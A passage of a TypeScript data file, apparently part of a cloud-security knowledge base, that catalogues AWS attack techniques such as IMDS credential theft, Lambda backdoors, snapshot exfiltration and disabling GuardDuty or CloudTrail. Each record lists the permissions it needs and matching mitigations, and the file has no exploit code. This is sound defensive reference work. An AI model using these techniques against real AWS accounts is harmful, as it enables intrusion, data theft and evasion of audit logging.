    description: "Create or modify IAM Roles Anywhere trust anchors and profiles to enable certificate-based access from attacker-controlled infrastructure.",
    services: ["IAM", "Roles Anywhere"],
    permissions: ["rolesanywhere:CreateTrustAnchor", "rolesanywhere:CreateProfile"],
    detectionIds: [],
    mitigations: ["Restrict Roles Anywhere management", "Audit trust anchors", "Use certificate pinning"],
    category: "persistence",
  },
  {
    id: "tech-codebuild-github-runner",
    name: "CodeBuild GitHub Runner Persistence",
    shortName: "CodeBuild Runner",
    description: "Create a CodeBuild project that acts as a GitHub Actions runner, enabling code execution and credential theft from GitHub workflows.",
    services: ["CodeBuild", "IAM"],
    permissions: ["codebuild:CreateProject", "iam:PassRole"],
    detectionIds: [],
    mitigations: ["Restrict CodeBuild project creation", "Audit GitHub integrations", "Use OIDC for GitHub Actions"],
    category: "persistence",
  },
  {
    id: "tech-ec2-userdata-disclosure",
    name: "EC2 User Data Disclosure",
    shortName: "UserData Leak",
    description: "Retrieve EC2 instance user data (e.g., via DescribeInstanceAttribute or metadata) to extract embedded secrets or bootstrap scripts.",
    services: ["EC2"],
    permissions: ["ec2:DescribeInstanceAttribute", "ec2:DescribeInstances"],
    detectionIds: [],
    mitigations: ["Avoid secrets in user data", "Use Secrets Manager", "Restrict DescribeInstanceAttribute"],
    category: "credential-access",
  },
  {
    id: "tech-ec2-userdata-injection",
    name: "EC2 User Data Injection",
    shortName: "UserData Inject",
    description: "Modify EC2 instance user data (e.g., via ModifyInstanceAttribute) to inject malicious bootstrap scripts for persistence or credential theft.",
    services: ["EC2"],
    permissions: ["ec2:ModifyInstanceAttribute"],
    detectionIds: [],
    mitigations: ["Restrict ModifyInstanceAttribute", "Use immutable instances", "Monitor user data changes"],
    category: "privilege-escalation",
  },
  {
    id: "tech-external-imds-ssrf",
    name: "External IMDS SSRF (No Credentials)",
    shortName: "IMDS SSRF",
    description: "Exploit SSRF in a publicly accessible web app to reach EC2 IMDS and steal instance role credentials without any prior AWS credentials.",
    services: ["EC2", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Enforce IMDSv2", "Fix SSRF vulnerabilities", "Use VPC endpoints for metadata"],
    category: "credential-access",
    references: [
      { source: "Hacking the Cloud", url: "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/" },
      { source: "CloudGoat", url: "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/cloud_breach_s3.md" },
    ],
  },
  {
    id: "tech-ssm-session",
    name: "SSM Session Manager Access",
    shortName: "SSM Session",
    description: "Use SSM Session Manager to gain interactive shell access to EC2 instances without SSH keys or open port 22.",
    services: ["SSM", "EC2"],
    permissions: ["ssm:StartSession"],
    detectionIds: [],
    mitigations: ["Restrict StartSession", "Enable session logging", "Use least-privilege instance profiles"],
    category: "lateral-movement",
  },
  {
    id: "tech-ssm-via-tags",
    name: "SSM Access via CreateTags Bypass",
    shortName: "SSM CreateTags",
    description: "Bypass SSM resource-based access by adding attacker-controlled tags to instances, then using StartSession.",
    services: ["SSM", "EC2"],
    permissions: ["ssm:AddTagsToResource", "ec2:CreateTags", "ssm:StartSession"],
    detectionIds: ["det-029"],
    mitigations: ["Restrict CreateTags on EC2/SSM", "Use resource policies", "Audit tag changes"],
    category: "lateral-movement",
  },
  {
    id: "tech-volume-snapshot-loot",
    name: "EC2 Volume Snapshot Loot",
    shortName: "Snapshot Loot",
    description: "Create a snapshot of an EC2 volume, copy it to attacker account, and mount to extract credentials or sensitive data.",
    services: ["EC2"],
    permissions: ["ec2:CreateSnapshot", "ec2:ModifySnapshotAttribute", "ec2:CreateVolume"],
    detectionIds: [],
    mitigations: ["Restrict snapshot creation", "Encrypt volumes", "Monitor cross-account snapshot sharing"],
    category: "credential-access",
  },
  {
    id: "tech-public-snapshot-loot",
    name: "Public EBS Snapshot Loot",
    shortName: "Public Snapshot",
    description: "Access publicly shared EBS snapshots to extract data or credentials from unencrypted volumes.",
    services: ["EC2"],
    permissions: ["ec2:CopySnapshot", "ec2:DescribeSnapshots"],
    detectionIds: [],
    mitigations: ["Avoid public snapshots", "Encrypt all volumes", "Use SCPs to block public sharing"],
    category: "credential-access",
  },
  {
    id: "tech-ec2-password-data",
    name: "EC2 Get Password Data (Windows)",
    shortName: "Password Data",
    description: "Retrieve Windows instance password data via GetPasswordData to obtain RDP credentials.",
    services: ["EC2"],
    permissions: ["ec2:GetPasswordData"],
    detectionIds: [],
    mitigations: ["Restrict GetPasswordData", "Use SSM for credential retrieval", "Prefer Linux/SSM"],
    category: "credential-access",
  },
  {
    id: "tech-ec2-instance-connect",
    name: "EC2 Instance Connect",
    shortName: "Instance Connect",
    description: "Use EC2 Instance Connect to push a temporary SSH key and gain shell access to instances.",
    services: ["EC2"],
    permissions: ["ec2-instance-connect:SendSSHPublicKey"],
    detectionIds: [],
    mitigations: ["Restrict SendSSHPublicKey", "Use SSM Session Manager", "Audit instance connect usage"],
    category: "lateral-movement",
  },
  {
    id: "tech-ec2-serial-console",
    name: "EC2 Serial Console Access",
    shortName: "Serial Console",
    description: "Enable and use EC2 Serial Console for direct serial access to instance console, bypassing network restrictions.",
    services: ["EC2"],
    permissions: ["ec2-instance-connect:SendSerialConsoleSSHPublicKey"],
    detectionIds: [],
    mitigations: ["Restrict serial console", "Audit serial console access", "Use account-level serial console settings"],
    category: "lateral-movement",
  },
  {
    id: "tech-security-group-open-22",
    name: "Security Group Port 22 Ingress",
    shortName: "SG Port 22",
    description: "Modify security groups to open port 22 (SSH) from attacker IP for direct SSH access to instances.",
    services: ["EC2"],
    permissions: ["ec2:AuthorizeSecurityGroupIngress"],
    detectionIds: [],
    mitigations: ["Restrict security group changes", "Use SSM instead of SSH", "Monitor ingress rule changes"],
    category: "lateral-movement",
  },
  {
    id: "tech-efs-access-from-ec2",
    name: "EFS Access from EC2 (VPC)",
    shortName: "EFS from EC2",
    description: "Mount EFS file systems from compromised EC2 instances to access shared file data across the VPC.",
    services: ["EFS", "EC2"],
    permissions: ["elasticfilesystem:DescribeFileSystems", "elasticfilesystem:DescribeMountTargets"],
    detectionIds: [],
    mitigations: ["Restrict EFS access via security groups", "Use encryption", "Audit EFS mount activity"],
    category: "lateral-movement",
  },
  {
    id: "tech-lambda-credential-theft",
    name: "Lambda Credential Theft via SSRF",
    shortName: "Lambda Cred Theft",
    description: "Exploit SSRF in a Lambda function to reach IMDS or internal services and steal credentials from the function's execution role.",
    services: ["Lambda", "EC2", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Fix SSRF in Lambda code", "Use least-privilege roles", "Restrict outbound Lambda access"],
    category: "credential-access",
  },
  {
    id: "tech-lambda-config-update",
    name: "Lambda Configuration Update",
    shortName: "Lambda Config",
    description: "Update Lambda function configuration (env vars, VPC, role) to enable credential theft or code execution.",
    services: ["Lambda"],
    permissions: ["lambda:UpdateFunctionConfiguration", "lambda:UpdateFunctionCode"],
    detectionIds: [],
    mitigations: ["Restrict Lambda updates", "Use immutable deployments", "Audit configuration changes"],
    category: "privilege-escalation",
  },
  {
    id: "tech-lambda-backdoor",
    name: "Lambda Resource Policy Backdoor",
    shortName: "Lambda Backdoor",
    description: "Add a resource-based policy to a Lambda function allowing attacker principals to invoke it, creating a persistent backdoor.",
    services: ["Lambda", "IAM"],
    permissions: ["lambda:AddPermission"],
    detectionIds: ["det-005"],
    mitigations: ["Restrict AddPermission", "Audit Lambda resource policies", "Use private functions"],
    category: "persistence",
  },
  {
    id: "tech-ecs-task-credential-theft",
    name: "ECS Task Role Credential Theft",
    shortName: "ECS Cred Theft",
    description: "Extract IAM credentials from ECS task role via container IMDS or environment variable exposure.",
    services: ["ECS", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Use least-privilege task roles", "Restrict container capabilities", "Monitor ECS task credential access"],
    category: "credential-access",
  },
  {
    id: "tech-ecs-task-definition-backdoor",
    name: "ECS Task Definition Backdoor",
    shortName: "ECS Backdoor",
    description: "Register a malicious ECS task definition (malicious image or entrypoint) to run attacker code with task role permissions.",
    services: ["ECS", "IAM"],
    permissions: ["ecs:RegisterTaskDefinition", "ecs:UpdateService"],
    detectionIds: ["det-027"],
    mitigations: ["Restrict RegisterTaskDefinition", "Use image signing", "Audit task definition changes"],
    category: "privilege-escalation",
  },
  {
    id: "tech-s3-acl-persistence",
    name: "S3 ACL Persistence",
    shortName: "S3 ACL",
    description: "Set S3 ACLs (e.g., bucket-owner-full-control) to maintain access to objects even after IAM policy changes.",
    services: ["S3"],
    permissions: ["s3:PutObjectAcl", "s3:PutBucketAcl"],
    detectionIds: [],
    mitigations: ["Disable ACLs (Object Ownership: BucketOwnerEnforced)", "Monitor ACL changes", "Use bucket policies"],
    category: "persistence",
  },
  {
    id: "tech-codebuild-env-theft",
    name: "CodeBuild Environment Credential Theft",
    shortName: "CodeBuild Env",
    description: "Extract credentials from CodeBuild environment variables or parameter store references during build execution.",
    services: ["CodeBuild", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Avoid secrets in env vars", "Use Secrets Manager with least-privilege", "Audit CodeBuild projects"],
    category: "credential-access",
  },
  {
    id: "tech-beanstalk-env-theft",
    name: "Elastic Beanstalk Environment Credential Theft",
    shortName: "Beanstalk Env",
    description: "Extract credentials from Elastic Beanstalk environment configuration (env vars, RDS connection strings).",
    services: ["Elastic Beanstalk", "IAM"],
    permissions: ["elasticbeanstalk:DescribeConfigurationSettings"],
    detectionIds: [],
    mitigations: ["Avoid secrets in env config", "Use Secrets Manager", "Restrict DescribeConfigurationSettings"],
    category: "credential-access",
  },
  {
    id: "tech-beanstalk-credential-pivot",
    name: "Beanstalk Credential Pivot",
    shortName: "Beanstalk Pivot",
    description: "Use stolen Beanstalk credentials (e.g., iam:CreateAccessKey) to create new access keys and escalate to admin.",
    services: ["Elastic Beanstalk", "IAM"],
    permissions: ["iam:CreateAccessKey"],
    detectionIds: [],
    mitigations: ["Least-privilege instance profiles", "Restrict CreateAccessKey", "Audit Beanstalk role usage"],
    category: "lateral-movement",
  },
  {
    id: "tech-cognito-identity-pool-creds",
    name: "Cognito Identity Pool Credential Access",
    shortName: "Identity Pool",
    description: "Obtain temporary credentials from Cognito Identity Pools using unauthenticated or weakly authenticated access.",
    services: ["Cognito"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Use authenticated identity pools", "Restrict unauthenticated access", "Audit GetCredentialsForIdentity"],
    category: "credential-access",
  },
  {
    id: "tech-oidc-trust-misconfig",
    name: "OIDC Trust Policy Misconfiguration",
    shortName: "OIDC Misconfig",
    description: "Exploit overly permissive OIDC trust policies (e.g., GitHub, GitLab) to assume roles from attacker-controlled repos.",
    services: ["IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Use strict OIDC conditions (aud, sub)", "Verify IdP URLs", "Audit OIDC trust policies"],
    category: "initial-access",
  },
  {
    id: "tech-cognito-self-signup",
    name: "Cognito User Pool Self-Signup",
    shortName: "Cognito SignUp",
    description: "Exploit open self-signup in Cognito User Pools to create attacker-controlled accounts and gain application access.",
    services: ["Cognito"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Disable self-signup", "Use admin-only user creation", "Implement invite flows"],
    category: "initial-access",
  },
  {
    id: "tech-cloudfront-origin-takeover",
    name: "CloudFront Orphaned Origin Takeover",
    shortName: "Origin Takeover",
    description: "Take over orphaned CloudFront origins (e.g., deleted S3 buckets) by creating a bucket with the same name to serve malicious content.",
    services: ["CloudFront", "S3"],
    permissions: ["s3:CreateBucket"],
    detectionIds: [],
    mitigations: ["Use custom domain origins", "Reserve bucket names", "Audit CloudFront distributions"],
    category: "initial-access",
  },
  {
    id: "tech-resource-policy-misconfig",
    name: "Resource Policy Misconfiguration Abuse",
    shortName: "Resource Policy",
    description: "Exploit resource policies with overly permissive principals (e.g., Principal: *) to access S3, Lambda, or other resources.",
    services: ["S3", "Lambda", "IAM"],
    permissions: ["s3:GetObject", "lambda:InvokeFunction"],
    detectionIds: ["det-017", "det-018"],
    mitigations: ["Avoid Principal *", "Use least-privilege resource policies", "Audit with Access Analyzer"],
    category: "initial-access",
  },
  {
    id: "tech-bedrock-agent-hijacking",
    name: "Bedrock Agent Hijacking",
    shortName: "Bedrock Hijack",
    description: "Modify Bedrock agent configuration (e.g., Lambda function) to hijack agent behavior and invoke with elevated permissions.",
    services: ["Bedrock", "Lambda"],
    permissions: ["bedrock:UpdateAgent", "lambda:UpdateFunctionCode"],
    detectionIds: [],
    mitigations: ["Restrict agent updates", "Audit agent configurations", "Use immutable agent versions"],
    category: "privilege-escalation",
  },
  {
    id: "tech-bedrock-invoke-model",
    name: "Bedrock InvokeModel Abuse",
    shortName: "Bedrock Invoke",
    description: "Abuse Bedrock InvokeModel permissions to exfiltrate data via prompt injection or model output.",
    services: ["Bedrock"],
    permissions: ["bedrock:InvokeModel"],
    detectionIds: [],
    mitigations: ["Restrict InvokeModel", "Monitor model usage", "Use guardrails"],
    category: "exfiltration",
  },
  {
    id: "tech-backup-enumeration",
    name: "AWS Backup Service Enumeration",
    shortName: "Backup Enum",
    description: "Enumerate AWS Backup recovery points and restore data to extract credentials or sensitive information from backups.",
    services: ["Backup"],
    permissions: ["backup:DescribeRecoveryPoint", "backup:StartRestoreJob"],
    detectionIds: [],
    mitigations: ["Restrict backup access", "Encrypt recovery points", "Audit restore jobs"],
    category: "credential-access",
  },
  {
    id: "tech-access-key-decode",
    name: "Access Key Account ID Decode",
    shortName: "Key Decode",
    description: "Decode AWS access key IDs to extract account ID for reconnaissance and targeted attacks.",
    services: ["IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["N/A - public metadata", "Use access key format awareness in detection"],
    category: "credential-access",
  },
  {
    id: "tech-guardduty-detector-evasion",
    name: "GuardDuty Detector Modification",
    shortName: "GuardDuty Evasion",
    description: "Modify or disable GuardDuty detectors to evade detection of malicious activity.",
    services: ["GuardDuty"],
    permissions: ["guardduty:UpdateDetector", "guardduty:DeleteDetector"],
    detectionIds: [],
    mitigations: ["Restrict GuardDuty management", "Use delegated admin", "Alert on detector changes"],
    category: "defense-evasion",
  },
  {
    id: "tech-guardduty-ip-trust-evasion",
    name: "GuardDuty IP Trust List Evasion",
    shortName: "IP Trust List",
    description: "Add attacker IPs to GuardDuty trusted IP lists to suppress findings from those sources.",
    services: ["GuardDuty"],
    permissions: ["guardduty:CreateIPSet", "guardduty:UpdateIPSet"],
    detectionIds: [],
    mitigations: ["Restrict trusted IP management", "Audit IP set changes", "Use delegated admin"],
    category: "defense-evasion",
  },
  {
    id: "tech-guardduty-event-rules-evasion",
    name: "GuardDuty EventBridge Rule Evasion",
    shortName: "EventBridge Rules",
    description: "Modify or delete EventBridge rules that forward GuardDuty findings to suppress alerting.",
    services: ["GuardDuty", "EventBridge"],
    permissions: ["events:DeleteRule", "events:PutRule", "events:PutTargets"],
    detectionIds: [],
    mitigations: ["Restrict EventBridge rule management", "Use SNS for findings", "Audit rule changes"],
    category: "defense-evasion",
  },
  {
    id: "tech-guardduty-suppression",
    name: "GuardDuty Filter Suppression",
    shortName: "Filter Suppression",
    description: "Create or update GuardDuty filter rules to suppress specific finding types.",
    services: ["GuardDuty"],
    permissions: ["guardduty:CreateFilter", "guardduty:UpdateFilter"],
    detectionIds: [],
    mitigations: ["Restrict filter management", "Audit filter changes", "Use delegated admin"],
    category: "defense-evasion",
  },
  {
    id: "tech-guardduty-publishing-evasion",
    name: "GuardDuty Publishing Destination Deletion",
    shortName: "Publishing Evasion",
    description: "Delete or modify GuardDuty publishing destinations to stop findings from reaching SIEM or S3.",
    services: ["GuardDuty"],
    permissions: ["guardduty:DeletePublishingDestination", "guardduty:UpdatePublishingDestination"],
    detectionIds: [],
    mitigations: ["Restrict publishing destination management", "Use delegated admin", "Alert on destination changes"],
    category: "defense-evasion",
  },
  {
    id: "tech-cloudtrail-config-update",
    name: "CloudTrail Configuration Update",
    shortName: "CloudTrail Config",
    description: "Update CloudTrail configuration (e.g., disable logging, change bucket) to evade audit logging.",
    services: ["CloudTrail"],
    permissions: ["cloudtrail:UpdateTrail", "cloudtrail:PutEventSelectors"],
    detectionIds: [],
    mitigations: ["Restrict CloudTrail updates", "Use organization trail", "Alert on trail changes"],
    category: "defense-evasion",
  },
  {
    id: "tech-cloudtrail-bucket-lifecycle",
    name: "CloudTrail Bucket Lifecycle Modification",
    shortName: "Lifecycle Mod",
    description: "Modify S3 lifecycle rules on the CloudTrail bucket to delete or transition logs and reduce retention.",
    services: ["CloudTrail", "S3"],
    permissions: ["s3:PutBucketLifecycleConfiguration"],
    detectionIds: [],
    mitigations: ["Restrict bucket lifecycle", "Use dedicated logging account", "Enable object lock"],
    category: "defense-evasion",
  },
  {
    id: "tech-cloudtrail-event-selectors",
    name: "CloudTrail Event Selectors Modification",
    shortName: "Event Selectors",
    description: "Modify CloudTrail event selectors to exclude data events or management events and reduce logging coverage.",
    services: ["CloudTrail"],
    permissions: ["cloudtrail:PutEventSelectors"],
    detectionIds: [],
    mitigations: ["Restrict PutEventSelectors", "Use organization trail", "Audit event selector changes"],
    category: "defense-evasion",
  },
  {
    id: "tech-share-ami",
    name: "AMI Sharing with External Account",
    shortName: "AMI Share",
    description: "Share AMIs with external attacker-controlled accounts for exfiltration or persistence.",
    services: ["EC2"],
    permissions: ["ec2:ModifyImageAttribute"],
    detectionIds: [],
    mitigations: ["Restrict ModifyImageAttribute", "Audit AMI sharing", "Use private AMIs"],
    category: "exfiltration",
  },
  {
    id: "tech-share-ebs-snapshot",
    name: "EBS Snapshot Sharing",
    shortName: "EBS Share",
    description: "Share EBS snapshots with external accounts to exfiltrate volume data.",
    services: ["EC2"],
    permissions: ["ec2:ModifySnapshotAttribute"],
    detectionIds: [],
    mitigations: ["Restrict snapshot sharing", "Encrypt snapshots", "Audit ModifySnapshotAttribute"],
    category: "exfiltration",
  },
  {
    id: "tech-share-rds-snapshot",
    name: "RDS Snapshot Sharing",
    shortName: "RDS Share",
    description: "Share RDS snapshots with external accounts to exfiltrate database data.",
    services: ["RDS"],
    permissions: ["rds:ModifyDBSnapshotAttribute"],
    detectionIds: [],
    mitigations: ["Restrict RDS snapshot sharing", "Encrypt snapshots", "Audit sharing changes"],
    category: "exfiltration",
  },
  {
    id: "tech-dns-logs-deletion",
    name: "Route53 Resolver Log Deletion",
    shortName: "DNS Logs",
    description: "Delete Route53 Resolver query logs to evade DNS-based detection.",
    services: ["Route53"],
    permissions: ["route53resolver:DeleteResolverQueryLogConfig"],
    detectionIds: [],
    mitigations: ["Restrict resolver log deletion", "Use centralized logging", "Alert on log config changes"],
    category: "defense-evasion",
  },
  {
    id: "tech-organizations-leave",
    name: "AWS Organizations Leave",
    shortName: "Org Leave",
    description: "Leave AWS Organizations to escape SCP restrictions and operate outside organizational controls.",
    services: ["Organizations"],
    permissions: ["organizations:LeaveOrganization"],
    detectionIds: [],
    mitigations: ["Restrict LeaveOrganization", "Use SCPs to deny leave", "Alert on leave attempts"],
    category: "defense-evasion",
  },
  {
    id: "tech-vpc-flow-logs-removal",
    name: "VPC Flow Logs Removal",
    shortName: "Flow Logs",
    description: "Delete VPC flow logs to evade network-based detection.",
    services: ["EC2"],
    permissions: ["ec2:DeleteFlowLogs"],
    detectionIds: [],
    mitigations: ["Restrict DeleteFlowLogs", "Use organization-level flow logs", "Alert on flow log deletion"],
    category: "defense-evasion",
  },
  {
    id: "tech-ses-enumeration",
    name: "SES Identity Enumeration",
    shortName: "SES Enum",
    description: "Enumerate SES identities (emails, domains) to gather reconnaissance for phishing or credential theft.",
    services: ["SES"],
    permissions: ["ses:ListIdentities", "ses:GetIdentityVerificationAttributes"],
    detectionIds: [],
    mitigations: ["Restrict SES enumeration", "Audit ListIdentities usage", "Use least-privilege"],
    category: "credential-access",
  },
  {
    id: "tech-sagemaker-lifecycle-injection",
    name: "SageMaker Lifecycle Config Injection",
    shortName: "SageMaker Lifecycle",
    description: "Inject malicious lifecycle configuration into SageMaker notebooks or training jobs to execute code with notebook role permissions.",
    services: ["SageMaker"],
    permissions: ["sagemaker:CreateNotebookInstance", "sagemaker:UpdateNotebookInstance"],
    detectionIds: [],
    mitigations: ["Restrict lifecycle config", "Audit notebook instances", "Use approved lifecycle scripts"],
    category: "privilege-escalation",
  },
  {
    id: "tech-eks-access-entry",
    name: "EKS Create Access Entry",
    shortName: "EKS Access",
    description: "Create EKS access entries to grant cluster access to attacker principals, enabling Kubernetes API access.",
    services: ["EKS"],
    permissions: ["eks:CreateAccessEntry", "eks:AssociateAccessPolicy"],
    detectionIds: [],
    mitigations: ["Restrict CreateAccessEntry", "Audit access entries", "Use IRSA with least-privilege"],
    category: "privilege-escalation",
  },
  {
    id: "tech-eventbridge-rule-persistence",
    name: "EventBridge Rule Persistence",
    shortName: "EventBridge Rule",
    description: "Create EventBridge rules that trigger Lambda or other actions on a schedule or event pattern for persistence.",
    services: ["EventBridge", "Lambda"],
    permissions: ["events:PutRule", "events:PutTargets"],
    detectionIds: ["det-013"],
    mitigations: ["Restrict PutRule/PutTargets", "Audit EventBridge rules", "Use least-privilege targets"],
    category: "persistence",
  },
];

// ─── Lookup helpers ───

export function getTechniqueById(id: string): Technique | undefined {
  return techniques.find((t) => t.id === id);
}

export function getTechniquesByIds(ids: string[]): Technique[] {
  return ids.map((id) => techniques.find((t) => t.id === id)).filter(Boolean) as Technique[];
}

export function getTechniquesByCategory(category: TechniqueCategory): Technique[] {
  return techniques.filter((t) => t.category === category);
}

